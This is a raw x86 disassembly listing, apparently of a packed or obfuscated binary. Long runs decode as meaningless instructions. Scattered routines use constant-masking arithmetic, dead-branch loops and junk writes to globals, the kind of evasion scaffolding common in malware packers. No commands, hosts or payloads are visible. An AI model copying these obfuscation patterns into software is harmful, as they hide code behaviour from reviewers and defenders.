  405919:	ret    0xc091
  40591c:	cmp    eax,DWORD PTR [ebx]
  40591e:	xlat   BYTE PTR ds:[ebx]
  40591f:	mov    edi,0x4643af96
  405924:	push   ss
  405925:	jle    0x40596a
  405927:	loopne 0x405994
  405929:	adc    DWORD PTR [esi],ecx
  40592b:	lods   eax,DWORD PTR ds:[esi]
  40592c:	jbe    0x4058c4
  40592e:	xchg   ebx,eax
  40592f:	jp     0x40592b
  405931:	enter  0x2ad6,0xdb
  405935:	mov    dh,0x89
  405937:	stos   BYTE PTR es:[edi],al
  405938:	in     al,0x44
  40593a:	jne    0x4058f4
  40593c:	xor    al,0x9e
  40593e:	or     DWORD PTR [ebx+edx*1-0x6a],edx
  405942:	mov    ch,0x75
  405944:	xor    al,al
  405946:	mov    esp,0xe0b49670
  40594b:	push   0x4d
  40594d:	push   es
  40594e:	loope  0x4059c7
  405950:	ficomp DWORD PTR [esi-0x44423517]
  405956:	mov    ds:0x6ed6f34f,al
  40595b:	mov    edi,0x24263e8b
  405960:	add    BYTE PTR [esi],0x2a
  405963:	or     al,0x5
  405965:	inc    edx
  405966:	ret    
  405967:	pop    esp
  405968:	inc    eax
  405969:	stos   BYTE PTR es:[edi],al
  40596a:	mov    al,0x55
  40596c:	xchg   ecx,eax
  40596d:	ret    0x6ed6
  405970:	add    DWORD PTR [ebx*1+0x2105aa1e],0x4
  405978:	bound  eax,QWORD PTR [eax-0x41391e43]
  40597e:	repz scas al,BYTE PTR es:[edi]
  405980:	scas   al,BYTE PTR es:[edi]
  405981:	inc    ebp
  405982:	mov    eax,ds:0x3b297974
  405987:	pop    esp
  405988:	cmp    esi,DWORD PTR [edi+ecx*2]
  40598b:	cmc    
  40598c:	xchg   edi,eax
  40598d:	cmp    BYTE PTR [esp+eiz*8-0x50],cl
  405991:	inc    ecx
  405992:	add    ecx,ebx
  405994:	push   es
  405995:	imul   edx,DWORD PTR [edx-0x1b3c035d],0xffffff90
  40599c:	mov    bl,0x76
  40599e:	mov    ecx,ebx
  4059a0:	cdq    
  4059a1:	mov    al,ds:0x1bef899d
  4059a6:	fisub  WORD PTR [edx-0x4f03a93c]
  4059ac:	fwait
  4059ad:	daa    
  4059ae:	sub    BYTE PTR [esi],cl
  4059b0:	scas   al,BYTE PTR es:[edi]
  4059b1:	xor    al,0x8a
  4059b3:	pop    es
  4059b4:	out    0x9,eax
  4059b6:	ror    BYTE PTR [edi],0x96
  4059b9:	and    ebx,ecx
  4059bb:	sub    eax,0x92980a27
  4059c0:	push   edi
  4059c1:	mov    eax,0xdc8bdaca
  4059c6:	shl    BYTE PTR [ebp-0x7bd184f5],cl
  4059cc:	push   edx
  4059cd:	fld    TBYTE PTR [esi-0x80]
  4059d0:	sbb    al,0x6a
  4059d2:	ss inc eax
  4059d4:	mov    ebp,0x8fb51b8b
  4059d9:	xchg   edi,eax
  4059da:	dec    edi
  4059db:	jae    0x405a32
  4059dd:	lods   eax,DWORD PTR ds:[esi]
  4059de:	and    DWORD PTR [ebx-0x2491a6d5],0x73
  4059e5:	or     eax,0x22da9dd8
  4059ea:	sub    ebx,DWORD PTR [eax+0x8ecbc6b]
  4059f0:	(bad)  
  4059f1:	cmp    DWORD PTR [eax],eax
  4059f3:	pushf  
  4059f4:	out    dx,eax
  4059f5:	call   0x303094e3
  4059fa:	(bad)  
  4059fb:	xor    eax,edx
  4059fd:	(bad)  
  4059fe:	jo     0x405993
  405a00:	mov    ds:0xcab12fb2,eax
  405a05:	not    BYTE PTR [eax+0x6]
  405a08:	dec    esi
  405a09:	dec    esi
  405a0a:	cmp    ebx,ebx
  405a0c:	adc    DWORD PTR [edx],ebp
  405a0e:	and    DWORD PTR [edi],esi
  405a10:	or     eax,0x3c0d4d00
  405a15:	mov    ch,0x7d
  405a17:	pop    esp
  405a18:	loopne 0x4059a1
  405a1a:	xor    ebx,ebp
  405a1c:	add    dl,dh
  405a1e:	jns    0x405a2e
  405a20:	xor    eax,DWORD PTR [ebx+edi*1]
  405a23:	stc    
  405a24:	(bad)  
  405a25:	call   0x1eb6:0xbe1a9baf
  405a2c:	out    dx,eax
  405a2d:	icebp  
  405a2e:	adc    DWORD PTR [edi],esi
  405a30:	cmp    al,0xd7
  405a32:	das    
  405a33:	mov    edx,0xc3af0d53
  405a38:	popa   
  405a39:	xor    eax,0xa6566433
  405a3e:	push   0x72
  405a40:	xor    BYTE PTR [esi+0x5105dcfd],dh
  405a46:	pmulhuw mm4,mm1
  405a49:	ss (bad) 
  405a4b:	int    0x3a
  405a4d:	test   BYTE PTR [edx],cl
  405a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x973a624d
  405b88:	inc    eax
  405b89:	add    eax,0x70703284
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405baf
  405b93:	jb     0x405b29
  405b95:	pop    ebp
  405b96:	and    ch,BYTE PTR [ebp+ecx*1+0x35841065]
  405b9d:	jecxz  0x405bd5
  405b9f:	out    0xb5,eax
  405ba1:	call   0x99695918
  405ba6:	adc    BYTE PTR [ecx+0xbe4dec0],al
  405bac:	lods   eax,DWORD PTR ds:[esi]
  405bad:	bound  edx,QWORD PTR [ebp-0x67c169be]
  405bb3:	adc    DWORD PTR [ebp-0x339835e3],edx
  405bb9:	(bad)  
  405bba:	cmp    bh,bl
  405bbc:	mov    ebp,DWORD PTR [ebp+0x3be3ffd4]
  405bc2:	mov    DWORD PTR [ebp-0x7a],ecx
  405bc5:	les    eax,FWORD PTR [eax-0x1c373f1c]
  405bcb:	je     0x405b70
  405bcd:	cs dec ebp
  405bcf:	les    edx,FWORD PTR [ebx+0x22]
  405bd2:	mov    ecx,0x18e1fdd
  405bd7:	sub    al,0x17
  405bd9:	sbb    BYTE PTR [esi-0x21],al
  405bdc:	mov    DWORD PTR [edi],ebp
  405bde:	sub    BYTE PTR [ecx+edx*8],0xc7
  405be2:	push   esp
  405be3:	xor    BYTE PTR [esi+0x55398ab],cl
  405be9:	and    ecx,DWORD PTR [edi-0x1984e19e]
  405bef:	xchg   ebx,eax
  405bf0:	push   ss
  405bf1:	cli    
  405bf2:	getsec 
  405bf4:	pop    ebp
  405bf5:	aaa    
  405bf6:	(bad)  
  405bf8:	pop    ebp
  405bf9:	adc    BYTE PTR [edx],al
  405bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bfc:	sbb    BYTE PTR [ebx-0x6ac6e0d7],dl
  405c02:	outs   dx,DWORD PTR ds:[esi]
  405c03:	jo     0x405bb2
  405c05:	sub    edi,ecx
  405c07:	mul    DWORD PTR [edi]
  405c09:	imul   ecx,DWORD PTR [ecx+0x30213c19],0x8bdf0d3b
  405c13:	pusha  
  405c14:	pop    edi
  405c15:	ja     0x405bc7
  405c17:	mov    dh,0xb9
  405c19:	push   ebx
  405c1a:	add    al,0xc6
  405c1c:	test   DWORD PTR [ebx-0x79],ebp
  405c1f:	jecxz  0x405c38
  405c21:	in     eax,dx
  405c22:	neg    BYTE PTR [eax]
  405c24:	xchg   DWORD PTR ds:0xaf9fac9c,esi
  405c2a:	stc    
  405c2b:	out    dx,al
  405c2c:	push   0x48
  405c2e:	sbb    DWORD PTR [eax-0x39],eax
  405c31:	cmp    al,0x56
  405c33:	or     ecx,DWORD PTR [ecx]
  405c35:	fmul   DWORD PTR [ebp+ecx*8-0x5c]
  405c39:	push   ds
  405c3a:	sub    DWORD PTR [esi+0x71],esi
  405c3d:	jbe    0x405c3c
  405c3f:	test   al,0xd5
  405c41:	xor    DWORD PTR [eax],ebx
  405c43:	jmp    0x8f6e9096
  405c48:	and    BYTE PTR [esi+0x5d],ah
  405c4b:	outs   dx,BYTE PTR ds:[esi]
  405c4c:	and    DWORD PTR [eax+0x1c],esp
  405c4f:	xchg   ecx,eax
  405c50:	lods   al,BYTE PTR ds:[esi]
  405c51:	mov    edi,0xafb2420b
  405c56:	in     eax,dx
  405c57:	rcr    BYTE PTR [eax+edi*2+0x63fea7d9],0xf6
  405c5f:	test   BYTE PTR ds:0xae04308,bl
  405c65:	dec    esp
  405c66:	call   0xf4ec73e
  405c6b:	jmp    DWORD PTR [eax+0x44]
  405c6e:	mov    BYTE PTR [ebp+ebx*8-0x4142c15e],bl
  405c75:	cmp    DWORD PTR [ebx+0x2c5c5184],0x9649f18b
  405c7f:	jnp    0x405cc6
  405c81:	inc    ebx
  405c82:	and    BYTE PTR [eax],bh
  405c84:	out    0x7e,eax
  405c86:	sub    eax,edx
  405c88:	cmp    al,0x1
  405c8a:	mov    WORD PTR [esi+0x35],?
  405c8d:	jg     0x405c90
  405c8f:	mov    bl,dh
  405c91:	lea    ebp,[esi+ebp*2-0x39]
  405c95:	sbb    ecx,DWORD PTR [edx-0x6144d6a5]
  405c9b:	xor    ebp,DWORD PTR [ecx]
  405c9d:	sub    eax,0x948aaf2
  405ca2:	xchg   ebx,eax
  405ca3:	pop    esi
  405ca4:	aas    
  405ca5:	fnstenv [edx+esi*8+0x3f739c01]
  405cac:	xchg   BYTE PTR [esi],dl
  405cae:	jo     0x405c36
  405cb0:	repnz mov ds:0x7edbebab,al
  405cb6:	xchg   ebp,eax
  405cb7:	popa   
  405cb8:	push   ebp
  405cb9:	clc    
  405cba:	in     eax,0x5
  405cbc:	pop    esp
  405cbd:	xchg   edi,eax
  405cbe:	jle    0x405d37
  405cc0:	mov    dh,0x4c
  405cc2:	fiadd  WORD PTR [edx+0x55]
  405cc5:	pop    edi
  405cc6:	sbb    eax,0x2078df8
  405ccb:	mov    ah,0x5b
  405ccd:	clc    
  405cce:	retf   0xd565
  405cd1:	add    eax,0xe4e20122
  405cd6:	int3   
  405cd7:	ror    edi,1
  405cd9:	xchg   ecx,eax
  405cda:	mov    bl,0x69
  405cdc:	pop    es
  405cdd:	inc    edx
  405cde:	cli    
  405cdf:	and    al,0xf3
  405ce1:	jb     0x405cd7
  405ce3:	push   ecx
  405ce4:	sbb    DWORD PTR [eax+0x1d3f2073],esp
  405cea:	call   0xdb05:0x7c94eabd
  405cf1:	dec    edx
  405cf2:	push   ecx
  405cf3:	ja     0x405d4f
  405cf5:	adc    al,0x3d
  405cf7:	xchg   ebp,eax
  405cf8:	adc    DWORD PTR [edx+edx*8],esp
  405cfb:	mov    al,ds:0x433b84a2
  405d00:	leave  
  405d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d02:	pop    esp
  405d03:	push   eax
  405d04:	ret    0xd8b3
  405d07:	mov    ecx,0x12249eb8
  405d0c:	js     0x405ca7
  405d0e:	repz sbb eax,0xaa58335f
  405d14:	adc    edx,DWORD PTR [eax+0x5a]
  405d17:	cdq    
  405d18:	ss js  0x405c9e
  405d1b:	adc    ch,BYTE PTR [ebx-0x71]
  405d1e:	jbe    0x405d76
  405d20:	and    BYTE PTR [ecx+0x5e],dh
  405d23:	rcr    DWORD PTR [esi],cl
  405d25:	enter  0xe6a6,0x60
  405d29:	pop    ecx
  405d2a:	dec    ebx
  405d2b:	or     BYTE PTR [ecx-0x77],cl
  405d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d2f:	in     eax,dx
  405d30:	dec    ah
  405d32:	jl     0x405daa
  405d34:	xchg   edx,eax
  405d35:	icebp  
  405d36:	faddp  st(7),st
  405d38:	jmp    0xfbc031cf
  405d3d:	lods   eax,DWORD PTR ds:[esi]
  405d3e:	xor    BYTE PTR [ecx+0x41],0xb9
  405d42:	mov    eax,0xafd8c8ec
  405d47:	cmp    BYTE PTR [edx-0x58],bl
  405d4a:	xchg   edx,eax
  405d4b:	push   ss
  405d4c:	inc    edx
  405d4d:	adc    ch,BYTE PTR [eax-0x46efca19]
  405d53:	loopne 0x405d1a
  405d55:	inc    ebp
  405d56:	inc    eax
  405d57:	sbb    bl,BYTE PTR [edi-0x2f]
  405d5a:	out    0xe,al
  405d5c:	jmp    0x968b84de
  405d61:	sub    dl,ah
  405d63:	out    0x23,eax
  405d65:	ins    BYTE PTR es:[edi],dx
  405d66:	or     eax,0xc526431
  405d6b:	push   edx
  405d6c:	cmp    eax,0x85716197
  405d71:	pop    es
  405d72:	and    eax,0x12c13ff1
  405d77:	pop    edx
  405d78:	pop    edx
  405d79:	add    al,dl
  405d7b:	test   al,0x20
  405d7d:	imul   edi,DWORD PTR [ebx-0x64fb2f20],0x37
  405d84:	pop    eax
  405d85:	jle    0x405d0d
  405d87:	fisubr DWORD PTR ds:0xa249fcc8
  405d8d:	adc    DWORD PTR [edi],esp
  405d8f:	(bad)  
  405d90:	aam    0x18
  405d92:	ins    BYTE PTR es:[edi],dx
  405d93:	add    esi,DWORD PTR [eax+0x5e]
  405d96:	fmul   QWORD PTR [ebp+0x65]
  405d99:	and    al,0x32
  405d9b:	pop    edi
  405d9c:	sbb    al,BYTE PTR [edi+0x57]
  405d9f:	or     ebp,ebx
  405da1:	mov    al,ds:0xad30191a
  405da6:	inc    ebx
  405da7:	call   0xe4434005
  405dac:	test   DWORD PTR [edx+0x6a296f46],edi
  405db2:	lock or bl,BYTE PTR [ecx+0xb]
  405db6:	pop    edx
  405db7:	(bad)  
  405db8:	out    0x94,al
  405dba:	push   bp
  405dbc:	jle    0x405dea
  405dbe:	push   esp
  405dbf:	mov    edx,0x320ac597
  405dc4:	sbb    DWORD PTR [edi-0x48],ecx
  405dc7:	push   edi
  405dc8:	ror    DWORD PTR [ebx],1
  405dca:	dec    esi
  405dcb:	xchg   DWORD PTR [esp+esi*1-0x61],edx
  405dcf:	xchg   esp,eax
  405dd0:	(bad)  
  405dd1:	jmp    0x405de8
  405dd3:	pop    ebx
  405dd4:	push   ds
  405dd5:	adc    eax,0x9407c864
  405dda:	push   ss
  405ddb:	xor    ebp,DWORD PTR [esi]
  405ddd:	adc    eax,0x27be471e
  405de2:	push   edi
  405de3:	xor    DWORD PTR [eax],edi
  405de5:	ja     0x405dcf
  405de7:	xor    al,0x5f
  405de9:	inc    ecx
  405dea:	call   0x1230:0x6c2d6d8b
  405df1:	jno    0x405d7b
  405df3:	(bad)  
  405df4:	jmp    0x405dee
  405df6:	test   eax,0xdc42cc78
  405dfb:	fdivr  QWORD PTR [edi-0x35fdfdf2]
  405e01:	mul    DWORD PTR [edi+0x4b]
  405e04:	repz jnp 0x405d9b
  405e07:	xor    al,0xec
  405e09:	fsub   DWORD PTR [esi-0x2b]
  405e0c:	dec    edx
  405e0d:	pop    es
  405e0e:	leave  
  405e0f:	(bad)  
  405e10:	pop    esp
  405e11:	jns    0x405dbf
  405e13:	mov    DWORD PTR ss:[eax+edi*2+0x71],edx
  405e18:	clc    
  405e19:	xchg   esi,eax
  405e1a:	mov    ebx,cs
  405e1c:	sbb    dh,cl
  405e1e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e20:	dec    ebx
  405e21:	jmp    0x1ec2dd30
  405e26:	bound  ebp,QWORD PTR [eax+edx*4+0x4]
  405e2a:	sub    eax,DWORD PTR [bx-0x7f]
  405e2e:	dec    edx
  405e2f:	les    esi,FWORD PTR [ecx+0x1f]
  405e32:	push   ss
  405e33:	sbb    BYTE PTR [ebp-0xa],bl
  405e36:	mov    gs,WORD PTR [ecx]
  405e38:	xchg   DWORD PTR [edx+0x51],esi
  405e3b:	adc    DWORD PTR [eax-0x151350f4],0x5b
  405e42:	out    dx,eax
  405e43:	pop    ecx
  405e44:	nop
  405e45:	out    0x1a,al
  405e47:	fnstenv [ebx]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x0
  405ea8:	dec    ebx
  405ea9:	into   
  405eaa:	mov    edx,0x70703f3e
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e77
  405eb4:	aaa    
  405eb5:	xchg   esp,eax
  405eb6:	(bad)  [edi-0xe702751]
  405ebc:	rcl    BYTE PTR [esi-0x7e],cl
  405ebf:	aad    0xec
  405ec1:	cmc    
  405ec2:	sub    DWORD PTR [edi-0x1d],edi
  405ec5:	and    DWORD PTR [ebp+0x418786ee],0x2b63fd3e
  405ecf:	mov    ?,WORD PTR [ecx+0x1]
  405ed2:	gs xchg ebp,eax
  405ed4:	push   cs
  405ed5:	cmp    BYTE PTR [edx+eiz*1-0x6b320123],0x1b
  405edd:	mov    ch,0x73
  405edf:	cs xor dl,ah
  405ee2:	fneni(8087 only) 
  405ee4:	arpl   si,bx
  405ee6:	stos   BYTE PTR es:[edi],al
  405ee7:	push   eax
  405ee8:	mov    al,ds:0x98c2c6aa
  405eed:	dec    bl
  405eef:	lea    ebx,[esi]
  405ef1:	das    
  405ef2:	jbe    0x405eaa
  405ef4:	test   eax,0xc1d7ee83
  405ef9:	repz xchg esp,eax
  405efb:	adc    BYTE PTR [esp+eax*1],dh
  405efe:	dec    eax
  405eff:	inc    edx
  405f00:	xlat   BYTE PTR ds:[ebx]
  405f01:	call   0x1f6e:0x45c0a243
  405f08:	sahf   
  405f09:	inc    esp
  405f0a:	xor    DWORD PTR [esp+ebp*4+0x6f],esi
  405f0e:	mov    bh,bl
  405f10:	sbb    BYTE PTR [ecx],bl
  405f12:	push   0x27
  405f14:	lods   eax,DWORD PTR ds:[esi]
  405f15:	dec    ebx
  405f16:	jmp    0xafc3fe3e
  405f1b:	les    edi,FWORD PTR [ecx+0x31]
  405f1e:	xor    al,0x8e
  405f20:	jp     0x405f7a
  405f22:	cmp    BYTE PTR [esi-0x4991d989],bh
  405f28:	mov    DWORD PTR [ebx+ebp*4-0x56],edi
  405f2c:	dec    ecx
  405f2d:	cmp    eax,0xd232d44e
  405f32:	fidivr DWORD PTR [ebx*1+0x37f82cc6]
  405f39:	pop    edi
  405f3a:	push   ds
  405f3b:	cli    
  405f3c:	aam    0xf0
  405f3e:	jle    0x405f59
  405f40:	jnp    0x405f22
  405f42:	pop    ebx
  405f43:	les    esi,FWORD PTR [edx+0x7e]
  405f46:	(bad)  [esi]
  405f48:	shl    DWORD PTR [ebp+0x3680ef9e],cl
  405f4e:	add    cl,al
  405f50:	cmp    DWORD PTR [esi-0xb],eax
  405f53:	pop    esi
  405f54:	push   eax
  405f55:	pop    es
  405f56:	mov    esi,DWORD PTR [edx+0x5e20cbed]
  405f5c:	push   ss
  405f5d:	push   ecx
  405f5e:	(bad)  
  405f5f:	daa    
  405f60:	iret   
  405f61:	jae    0x405fbf
  405f63:	jle    0x405f79
  405f65:	xchg   esp,eax
  405f66:	test   eax,0xcb55a89c
  405f6b:	ds mov ebp,0xdcc6dad8
  405f71:	cmp    DWORD PTR [edi+0x2d12e2c7],edi
  405f77:	sbb    DWORD PTR [ebp+edi*2-0x314da0db],ebx
  405f7e:	sbb    eax,0x54032d3e
  405f83:	rcr    BYTE PTR [edx+eax*8],0xb9
  405f87:	sbb    al,0x2a
  405f89:	push   ds
  405f8a:	inc    eax
  405f8b:	(bad)  
  405f8c:	xchg   ecx,eax
  405f8d:	in     al,dx
  405f8e:	shl    DWORD PTR [ebp-0x22792e32],0x72
  405f95:	fwait
  405f96:	icebp  
  405f97:	test   eax,0xe5673afe
  405f9c:	or     dh,BYTE PTR [ecx]
  405f9e:	cs xor eax,0xa50ced40
  405fa4:	xchg   esp,eax
  405fa5:	mov    eax,ds:0x13eca297
  405faa:	out    0x47,al
  405fac:	shl    BYTE PTR [edi+0x9ed55c9],cl
  405fb2:	ret    
  405fb3:	and    eax,0xe3579604
  405fb8:	inc    edi
  405fb9:	loope  0x405f54
  405fbb:	ficomp WORD PTR [ebx+0x487a062c]
  405fc1:	and    DWORD PTR [edx+0x52eb87f0],ebp
  405fc7:	dec    ebx
  405fc8:	(bad)  
  405fc9:	call   0x8a7f4a1f
  405fce:	cmp    esi,esp
  405fd0:	in     al,0x9d
  405fd2:	addr16 pop ss
  405fd4:	sub    edx,ebx
  405fd6:	push   cs
  405fd7:	push   ebp
  405fd8:	fmul   QWORD PTR [esi-0x12051027]
  405fde:	es cmp eax,0x133d1eb9
  405fe4:	jne    0x40600e
  405fe6:	ret    
  405fe7:	loopne 0x405f82
  405fe9:	outs   dx,DWORD PTR ds:[esi]
  405fea:	loop   0x406005
  405fec:	jb     0x40606d
  405fee:	sbb    eax,DWORD PTR [edx+0x40e1af32]
  405ff4:	ins    BYTE PTR es:[edi],dx
  405ff5:	dec    edx
  405ff6:	mov    BYTE PTR [ecx+0x56],bl
  405ff9:	dec    esp
  405ffa:	std    
  405ffb:	aas    
  405ffc:	jne    0x406047
  405ffe:	shl    ebx,1
  406000:	jae    0x40602d
  406002:	inc    ebx
  406003:	xor    bl,ch
  406005:	das    
  406006:	in     al,0xd6
  406008:	mul    DWORD PTR [edx-0x80]
  40600b:	cmp    ebx,DWORD PTR [ecx+0x41546f71]
  406011:	or     DWORD PTR [ecx+0x190af7db],edx
  406017:	sub    esi,DWORD PTR [eax]
  406019:	or     ecx,DWORD PTR [edx]
  40601b:	pop    eax
  40601c:	repnz gs inc esp
  40601f:	sbb    eax,ebp
  406021:	push   eax
  406022:	add    BYTE PTR [edi-0x42],ch
  406025:	sar    DWORD PTR [ecx+0x126308ff],0x8c
  40602c:	inc    esi
  40602d:	mov    ecx,0x1dab2247
  406032:	push   ecx
  406033:	es mov esp,0xd6fd32d9
  406039:	lea    ebp,[ecx+0x2]
  40603c:	icebp  
  40603d:	xlat   BYTE PTR ds:[ebx]
  40603e:	add    dh,ch
  406040:	call   0xdd0f:0xea092dfb
  406047:	xor    BYTE PTR [edx-0x66181054],dl
  40604d:	and    DWORD PTR [esi+0x62],edi
  406050:	dec    ebp
  406051:	ins    BYTE PTR es:[edi],dx
  406052:	gs push eax
  406054:	sbb    ch,al
  406056:	mov    eax,0xd6317256
  40605b:	jne    0x406062
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fd860d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xe97c5496
  4060dc:	icebp  
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406096
  4060e6:	in     eax,0xd8
  4060e8:	mov    ds:0xf9ea55a0,eax
  4060ed:	jmp    0x6293922e
  4060f2:	shl    BYTE PTR [edi+0x5c1ae68a],cl
  4060f8:	loope  0x4060cb
  4060fa:	data16 in al,0xb4
  4060fd:	push   es
  4060fe:	mov    es,edx
  406100:	adc    bl,bh
  406102:	add    bh,BYTE PTR [eax+ebx*2-0x1e023293]
  406109:	pop    es
  40610a:	mov    ah,0xe
  40610c:	pop    eax
  40610d:	sbb    eax,0x6e7b12f9
  406112:	adc    al,0x22
  406114:	fs pop edx
  406116:	pop    ebx
  406117:	pop    ecx
  406118:	sar    DWORD PTR [edi+0x23],0x4c
  40611c:	out    dx,al
  40611d:	mov    ah,bl
  40611f:	in     al,0xb3
  406121:	add    DWORD PTR [eax-0x33],esp
  406124:	sbb    DWORD PTR [ebp-0x49875be4],edx
  40612a:	mov    eax,ds:0x77dac913
  40612f:	sub    al,0x32
  406131:	jbe    0x406107
  406133:	std    
  406134:	test   DWORD PTR [esi-0x50053844],ecx
  40613a:	sub    al,0xee
  40613c:	fsubrp st(5),st
  40613e:	add    ah,bh
  406140:	std    
  406141:	repz xlat BYTE PTR ds:[ebx]
  406143:	push   edx
  406144:	xchg   BYTE PTR [esi+edi*1-0x4a01ae61],ah
  40614b:	mov    al,ds:0xdb2393c
  406150:	aam    0xa8
  406152:	mov    ds:0x8c19567a,eax
  406157:	je     0x406116
  406159:	jb     0x40615d
  40615b:	or     dl,cl
  40615d:	pop    edx
  40615e:	es aad 0x5a
  406161:	(bad)  
  406162:	(bad)  [esi-0x30ddeea]
  406168:	lods   eax,DWORD PTR ds:[esi]
  406169:	not    BYTE PTR [edi]
  40616b:	shl    DWORD PTR [esp+edi*2-0x440f9ecf],cl
  406172:	pop    ecx
  406173:	jp     0x4061b1
  406175:	mov    esi,0x4e763758
  40617a:	nop
  40617b:	dec    eax
  40617c:	pop    eax
  40617d:	lock rcr DWORD PTR [edx-0x46],cl
